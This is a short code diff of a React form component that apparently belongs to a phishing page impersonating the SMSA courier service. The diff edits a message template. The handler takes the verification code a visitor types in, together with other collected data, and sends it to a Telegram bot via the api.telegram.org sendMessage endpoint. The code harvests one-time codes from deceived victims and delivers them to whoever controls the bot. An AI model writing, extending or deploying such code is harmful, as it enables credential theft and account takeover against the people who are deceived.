@@ -13,7 +13,7 @@ const Code = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
 
-    var length= `مدونة سمسا %0A كود التحقق : ${code.current.value} %0A BY Admin Zajil %0A %0A ${datas}:`
+    var length= `مدونة سمسا %0A كود التحقق : ${code.current.value} %0A %0A ${datas}:`
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
   
   }
